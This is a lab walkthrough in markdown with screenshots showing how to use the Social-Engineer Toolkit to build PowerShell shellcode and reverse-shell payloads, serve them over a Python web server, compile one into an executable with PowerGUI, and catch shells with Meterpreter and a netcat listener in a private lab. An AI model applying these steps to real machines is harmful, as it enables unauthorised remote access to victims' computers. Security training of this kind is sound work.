<h1 align="center"> Powershell Attack Victors Methodology </h1>



<img width="1100" height="800" alt="image" src="https://attuneops.io/wp-content/uploads/2024/12/PowerShell-Security-Best-Practices.jpg" />


# Powershell Attack Victors Methodology

## PowerShell Attack Vectors - Alphanumeric Shellcode Injector
- First in this open our `Terminal`:
````
sudo setoolkit
````
<img width="1100" height="800" alt="image" src="https://github.com/user-attachments/assets/a16565bc-dd69-4f43-8d19-e06213659273" />

- after we start our `SET`:
````
1
````
<img width="1100" height="844" alt="image" src="https://github.com/user-attachments/assets/624cac30-f22d-4174-bad7-cff61144d8a9" />

- Select `Powershell Attack Vectors`
````
9
````
<img width="538" height="842" alt="image" src="https://github.com/user-attachments/assets/86f50e34-13a8-4908-9a43-7db43df3804d" />


- Select `Powershell Alphanumeric Shellcode Injector`
````
1
````
<img width="1902" height="212" alt="image" src="https://github.com/user-attachments/assets/e3bdd078-65a2-4eda-919b-91feae53ce4d" />

- In this we need to input our `Local IP` or `IP Attacker`, I need to check -> Press `Ctrl + Ship + T`:
````
ifconfig
````
<img width="665" height="327" alt="image" src="https://github.com/user-attachments/assets/a9690e35-6988-4ed5-8535-488dbf25a36e" />

- Back to our `Setoolkit`:
````
192.168.127.128
442
````
<img width="868" height="231" alt="image" src="https://github.com/user-attachments/assets/9bcf1dc1-0d29-4309-b5d2-911a41aca233" />

- Now it will generate our `Power shell shellcode`, And now it stored our `Shellcode` in `/root/.set/reports/powershell/`, so i need to check:
<img width="1918" height="597" alt="image" src="https://github.com/user-attachments/assets/ba1ff97d-e943-48e9-9ee3-3ef43ba12c6b" />

<img width="1919" height="745" alt="image" src="https://github.com/user-attachments/assets/77cd1a4e-1385-4417-b181-b3a4d159c332" />

- Now we can't see it. we need `Root` user -> `Right-Click`:
<img width="1918" height="705" alt="image" src="https://github.com/user-attachments/assets/44d9871d-c0ad-4556-bd22-8581843a78ad" />

<img width="492" height="243" alt="image" src="https://github.com/user-attachments/assets/476fd073-3fbb-4e49-9a0a-1907b8ae7185" />

<img width="1916" height="447" alt="image" src="https://github.com/user-attachments/assets/973e94bd-97fc-40ae-9fbf-9386721661ed" />


<img width="1917" height="596" alt="image" src="https://github.com/user-attachments/assets/20fa1e6b-7990-4e00-a473-f97ceb21a213" />

- **Note**: if in this we don't see our file  like this.
- Click on `View` -> and after click on `Show Hidden Files` after it will show all our file like above.

- After click on `.set`:
<img width="1918" height="465" alt="image" src="https://github.com/user-attachments/assets/3c664c5e-ce45-4c5b-84ff-decf34a0668f" />

- After click on `Report`: 
<img width="1918" height="382" alt="image" src="https://github.com/user-attachments/assets/d80ba214-4c55-4494-97e5-ddfc9fae9737" />

- After click on `Powershell`:
<img width="1001" height="361" alt="image" src="https://github.com/user-attachments/assets/d347d6cd-53fc-4549-b742-92232f97540c" />

- After we will see our file:
<img width="1022" height="363" alt="image" src="https://github.com/user-attachments/assets/709d9dcf-08de-4227-8943-89cc50fd5307" />

- This i found file `x86_powershell_injection.txt`
<img width="1900" height="673" alt="image" src="https://github.com/user-attachments/assets/638d03cb-6c78-4785-bc7f-4a4e1ca04284" />

- We see folder have location in the same to our `Terminal`, if i want to see in those file have -> first `Right-Click` on `Powershell` file -> select `Run terminal here`:
````
cat x86_powershell_injection.txt
````
<img width="1742" height="773" alt="image" src="https://github.com/user-attachments/assets/996905bf-8bb8-4024-9447-faa0821b0bf5" />

- Now i see this.

- After i run with `Python Server`:
````
python3 -m hhtp.server 8000
````
<img width="911" height="296" alt="image" src="https://github.com/user-attachments/assets/36eb738a-cd92-4635-9ce4-6afb6967d4a7" />

- **Note**: we run python server in this folder: `/root/.set/reports/powershell/`. If we run others it maybe not see or try hard to find it.


- Do you want to start the listener now [yes/no]:
````
yes
````
<img width="836" height="667" alt="image" src="https://github.com/user-attachments/assets/2d44c4d0-0b7d-46b3-8741-83aff3d33e7c" />

<img width="839" height="340" alt="image" src="https://github.com/user-attachments/assets/ef42e26c-2635-4a05-b262-fc828780ba63" />

- And in our `Target`.

### In target:
- First go to `Browser`:
````
192.168.127.128:8000
````
<img width="1912" height="395" alt="image" src="https://github.com/user-attachments/assets/c184d360-1658-4cc9-86f4-126edbbcc4e6" />

- Now i see  the file. After click on it:
<img width="1916" height="596" alt="image" src="https://github.com/user-attachments/assets/246fbb99-6e2d-4084-ad2d-46219ba8c0ea" />

- To copy it `Ctrl + A` -> `Right-Click` -> select `Copy` OR Press `Ctrl + C`:
<img width="1917" height="641" alt="image" src="https://github.com/user-attachments/assets/b7f75229-564c-46e3-b9ce-15c2c01c5284" />

- After open `Notepad`:
<img width="785" height="680" alt="image" src="https://github.com/user-attachments/assets/edf11c5d-90b0-4bfd-b3b5-7e36523bf001" />

- Past our `Payload`:
<img width="1917" height="390" alt="image" src="https://github.com/user-attachments/assets/8efa4374-7f95-40bf-9a23-5319b63d1d44" />

<img width="1920" height="487" alt="image" src="https://github.com/user-attachments/assets/7d8092eb-f4da-469b-b66f-c7ebfda188f2" />

- Rename to `payload.ps1` -> click `Save`:
<img width="1011" height="521" alt="image" src="https://github.com/user-attachments/assets/962afb9b-4b64-47b4-bd15-74fd6602948f" />

- Go to `File`:
<img width="1918" height="941" alt="image" src="https://github.com/user-attachments/assets/b458d87e-ca7f-4bd8-a105-b7b9032540fe" />

- In this i take it on my `Screen`:
<img width="1022" height="623" alt="image" src="https://github.com/user-attachments/assets/69577ffb-3d7f-4de4-a24d-5d9546233ada" />

- After `Right-Click` -> `Run With Powershell`:
<img width="438" height="576" alt="image" src="https://github.com/user-attachments/assets/3aa7b7ef-d548-4cfd-b15c-41be56919a8b" />

- Now it will run, Bact to `Attacker`.


### IN Attacker:
- We will see this:
<img width="1237" height="359" alt="image" src="https://github.com/user-attachments/assets/f3fafcdd-5f00-4eaf-8022-a0280e87e1f5" />

- Press `Enter`, After: 
````
sessions
````
<img width="1175" height="152" alt="image" src="https://github.com/user-attachments/assets/88fd36d6-f1dd-4e78-8745-75ed441f4e24" />

- Now we see our target.

````
sessions 1
````
<img width="403" height="121" alt="image" src="https://github.com/user-attachments/assets/f01a8fd2-bf49-4adc-befe-e0053cdf40fc" />

- Right now we got `Target shell`. And we can do something in this.

- Get target `Information`:
````
sysinfo
````
<img width="515" height="161" alt="image" src="https://github.com/user-attachments/assets/d03ae7a6-3e08-47a9-b317-6bb66fa376ef" />

-----




## compiling PowerShell scripts to exe
- First open our `Setoolkit`:
````
sudo setoolkit
````
<img width="588" height="839" alt="image" src="https://github.com/user-attachments/assets/80b6775d-d79f-4e9e-a706-c0e070717705" />

- Select `Social-Engineering Attack`:
````
1
````
<img width="588" height="842" alt="image" src="https://github.com/user-attachments/assets/4d70ff09-d5e7-4e51-a645-b0c694070423" />


- Select `Powershell Attack Vectors`:
````
9
````
<img width="551" height="562" alt="image" src="https://github.com/user-attachments/assets/cae43c8b-96af-4f8e-817f-a3bfc2e0de92" />



- Select `Powershell Reverse Shell`:
````
2
````
<img width="1895" height="192" alt="image" src="https://github.com/user-attachments/assets/83117797-9a77-4541-a746-31793475dd67" />

- In this i need to check my kali `IP`:
````
ifconfig
````
<img width="658" height="337" alt="image" src="https://github.com/user-attachments/assets/91e964d6-74c2-4106-8790-9090c2592739" />


- Input our kali `ÃŒP` into `PAddress or DNS name for the reverse host`, And input `Port` for listener :
````
192.168.127.128
441
````
<img width="617" height="127" alt="image" src="https://github.com/user-attachments/assets/f99083d2-251e-4523-8bcb-d7953585db40" />

- In this my `Payload` stored in this `/root/.set/reports/powershell`.

- After in this i check my file:
<img width="1916" height="551" alt="image" src="https://github.com/user-attachments/assets/fe5ee729-ddca-46ad-8c42-e6e5795d3d09" />

<img width="405" height="152" alt="image" src="https://github.com/user-attachments/assets/c6bae244-87e7-4256-9d4a-a8c5752118be" />

- Now i can't see it, in this we need to run as `Root` -> `Right-Click` -> `Run as Root`:
<img width="1915" height="592" alt="image" src="https://github.com/user-attachments/assets/2bed7b82-616d-46e2-99d2-3c4f16eb1137" />

<img width="492" height="245" alt="image" src="https://github.com/user-attachments/assets/6f7d491d-3569-48e5-9a6c-0e1ab2d14531" />

- Now we see new folder:
<img width="1918" height="833" alt="image" src="https://github.com/user-attachments/assets/df0a04cb-2f6b-42f2-82dd-7c69eafa4442" />

<img width="1918" height="488" alt="image" src="https://github.com/user-attachments/assets/455a1267-604b-4690-9195-e09678c4f991" />

<img width="1056" height="347" alt="image" src="https://github.com/user-attachments/assets/2d47d17d-c1a6-4e73-bcec-413098a7365d" />

<img width="1077" height="327" alt="image" src="https://github.com/user-attachments/assets/153a5f68-7f34-4daf-bc2d-b5c597588ede" />

<img width="1025" height="352" alt="image" src="https://github.com/user-attachments/assets/c2820701-cc8c-4252-abc1-b8d1c3a17f87" />

- Now i see `Powershell.reverse.txt`.


- After go back to our `Terminal`:
````
yes
````
<img width="613" height="143" alt="image" src="https://github.com/user-attachments/assets/577a13bf-423a-4ff3-944b-461930cd4da7" />

- It now start `Listener`.

- And if in our `Powershell.reverse.txt` folder i `Right-Click` on it and select `open Terminal here`:
<img width="1100" height="477" alt="image" src="https://github.com/user-attachments/assets/362b6225-5193-42d2-a265-203204173b81" />

- In this w=i want to check it:
````
ls
cat powershell.reverse.txt
````
<img width="742" height="801" alt="image" src="https://github.com/user-attachments/assets/53c070d0-bf16-4da4-a58c-d8c1f7b573a6" />

- After in this i open `Python Server`:
````
python3 -m http.server 8000
````
<img width="568" height="204" alt="image" src="https://github.com/user-attachments/assets/28750219-3c52-4528-b113-a3200eaa9b66" />

- Now it start `Listener`.


### On Target:
- Go to our target -> open `Browser` -> type this:
````
192.168.127.128
````
- Run it in `Browser`:
<img width="646" height="306" alt="image" src="https://github.com/user-attachments/assets/66ca7996-c9d6-4d2d-9165-dc7258c7e024" />

- Now in our target i see the file `powershell.reverse.txt` -> `Click on it` -> `Copy` it:
<img width="697" height="730" alt="image" src="https://github.com/user-attachments/assets/8b2c70d7-c7d0-4049-9964-959345b8141c" />

- After go to our target normal screen amd `Open Notepad` -> `Past` it into `Notepad` -> `Ctrl + S`:
<img width="895" height="855" alt="image" src="https://github.com/user-attachments/assets/f0d02832-c96c-46c8-9cfa-fa2314a73533" />

- And after `Rename` it to `reverse.ps1`:
<img width="1000" height="512" alt="image" src="https://github.com/user-attachments/assets/69384187-a58f-4606-aec3-bf665ba088c5" />

### To compile this **Poershell script**:
- After our back to our `Browser` -> type `Powergui download`:
<img width="1915" height="811" alt="image" src="https://github.com/user-attachments/assets/3a3c9a0e-0300-4754-962b-9a74a49745fc" />

- Or we can go to direct `Link`: https://www.softpedia.com/get/Programming/File-Editors/Quest-PowerGUI.shtml
<img width="1911" height="823" alt="image" src="https://github.com/user-attachments/assets/7f7552eb-ebc2-46fd-89e3-382d1e077ef4" />

<img width="1338" height="816" alt="image" src="https://github.com/user-attachments/assets/8e590e3e-8345-4a49-a007-caf42f31ae0c" />

<img width="1817" height="841" alt="image" src="https://github.com/user-attachments/assets/4a3c045d-da26-4371-82dd-2618b670a3d3" />

- Now it will start download, wait a few minute it will finish download.
<img width="476" height="217" alt="image" src="https://github.com/user-attachments/assets/a39e66ef-843f-4706-bfa8-7a5dc6c640f4" />

- Now it finished download.  After download -> `File Explorers` -> `Download`:
<img width="852" height="678" alt="image" src="https://github.com/user-attachments/assets/54e1ee3d-c2de-4c62-9376-603180df129a" />

- Open it `Double-Click`:
<img width="502" height="387" alt="image" src="https://github.com/user-attachments/assets/5f9e3671-da3f-425f-b5d8-0601710e89f7" />

<img width="503" height="381" alt="image" src="https://github.com/user-attachments/assets/ad337d28-d250-42df-8475-dd33a928e75a" />

<img width="502" height="392" alt="image" src="https://github.com/user-attachments/assets/c269cfd3-4dcd-4920-9985-ba9dd846a87e" />

<img width="502" height="388" alt="image" src="https://github.com/user-attachments/assets/88bfb99f-0af6-48e2-8170-a86143624af3" />

<img width="503" height="387" alt="image" src="https://github.com/user-attachments/assets/78dac5d2-9ba5-4b57-a2c5-54bc335a5426" />

<img width="500" height="383" alt="image" src="https://github.com/user-attachments/assets/052b6e68-7086-4af4-9777-1bd4be5616d0" />

<img width="455" height="342" alt="image" src="https://github.com/user-attachments/assets/fc067680-1dc2-4fdb-b8c3-83baca7ace2c" />

<img width="502" height="394" alt="image" src="https://github.com/user-attachments/assets/3fe897c2-4c59-48ef-b8ce-21f81db743d6" />

- Now it start `Installing`, wait a few minute it will finish.
<img width="495" height="383" alt="image" src="https://github.com/user-attachments/assets/61ed8835-b246-4481-ab34-a8c0257da528" />

- Now it finished.

- After open it:
<img width="1918" height="898" alt="image" src="https://github.com/user-attachments/assets/df357f6c-821c-4abf-af88-3f3ae5140cf6" />

- After find and click on our `File Reverse.ps1` but in this it hide `ps1` it show only `Reverse`:
<img width="947" height="470" alt="image" src="https://github.com/user-attachments/assets/ad70cfdb-2977-46c9-a6e2-629f0a48fad6" />

- Now we see this:
<img width="1917" height="865" alt="image" src="https://github.com/user-attachments/assets/4b3fc072-9044-43d4-9055-0c1f724b2513" />

- After click on `Tools` -> `Compile Script`:
<img width="1645" height="657" alt="image" src="https://github.com/user-attachments/assets/a03cb329-b938-4d35-9f32-9d61a3ac4e7d" />

<img width="537" height="383" alt="image" src="https://github.com/user-attachments/assets/b73baa67-f111-43d3-92ad-74a8ad830ec5" />

<img width="485" height="371" alt="image" src="https://github.com/user-attachments/assets/e36e57cb-244c-4be5-b318-7bff98ab126a" />

<img width="942" height="480" alt="image" src="https://github.com/user-attachments/assets/d10d13d5-ca1e-4f6c-9346-0905d4dee417" />

<img width="480" height="375" alt="image" src="https://github.com/user-attachments/assets/ae5130b3-338b-4158-98c9-fe98c2bffc90" />

<img width="532" height="383" alt="image" src="https://github.com/user-attachments/assets/b6424c0f-da13-4186-86f1-01945b49c4ef" />

- Now our script has been compiled.

- After go back to our file:
<img width="1257" height="475" alt="image" src="https://github.com/user-attachments/assets/73d76e78-6e27-421e-ad63-819de13dd45b" />

<img width="1053" height="422" alt="image" src="https://github.com/user-attachments/assets/945cd2eb-77f1-416c-9cff-ee47accc4cd2" />

- Now we see our file payload `reverse.exe` -> after i take it to my screen:
<img width="842" height="598" alt="image" src="https://github.com/user-attachments/assets/ea39bb35-e7c5-4f44-8c3d-ab5407260cdd" />

- Now i see it on my screen, to run it just `Double-Click` on it:
<img width="983" height="521" alt="image" src="https://github.com/user-attachments/assets/8ef3ee85-b4fb-4a64-a31f-4a00484306f0" />

<img width="980" height="516" alt="image" src="https://github.com/user-attachments/assets/c5d2998a-e77c-4574-bfce-c5288eb2545c" />

- After go back to our `Attacker Terminal`.


### On Attacker:
<img width="597" height="165" alt="image" src="https://github.com/user-attachments/assets/27f65475-e8cc-410a-b560-42afb4374a3f" />

- Now we got the target `Shell`. Just Press `Enter`:
<img width="566" height="649" alt="image" src="https://github.com/user-attachments/assets/2fe729c8-b861-450c-9528-12e19decedd5" />

- Now it go back to this. After go to others `Terminal`:
````
nc -lvp 442
````
<img width="615" height="195" alt="image" src="https://github.com/user-attachments/assets/10927cd2-a102-42b1-96b1-c1864ed0be93" />

- Now we got target shell. but in this it maybe error like this:
<img width="592" height="211" alt="image" src="https://github.com/user-attachments/assets/6aa1c2b6-b411-4fd4-a3ad-62563473098b" />

- In this i need to listener as port `441`:
<img width="253" height="121" alt="image" src="https://github.com/user-attachments/assets/1c82dbe0-e0a3-461d-a0fe-d8b9e862cd73" />


- After in our target `Execute it again` just `Double click` on our `Payload`:
<img width="978" height="519" alt="image" src="https://github.com/user-attachments/assets/350c9df2-bca7-41ce-acea-0b290311d05b" />

- After go back to our `Attacker Terminal`:
<img width="826" height="224" alt="image" src="https://github.com/user-attachments/assets/f98b144e-5a9e-45cd-a5c6-adb40cdd0d10" />

- Right now we got the target `shell`.
````
whoami
dir
````
<img width="899" height="440" alt="image" src="https://github.com/user-attachments/assets/da0cb739-866b-4dfc-95ff-ed5e1b0c0e8e" />

- But in this i want to go back:
````
cd /
````
<img width="873" height="181" alt="image" src="https://github.com/user-attachments/assets/dc50cbd2-6b4c-4318-9299-b59417ddfbe3" />

````
dir
````
<img width="567" height="291" alt="image" src="https://github.com/user-attachments/assets/7e0539fb-93f8-4359-a3c5-a49782623dd5" />

- Now we got successful.

---

<h2 align="center"> Finished OF PowerShell Attack Vectors </h2>


<h2 align="center"> Author: Nin Kanong (k4n0ng) </h2>

<h3 align="center"> Date: 26/11/2025 </h3>
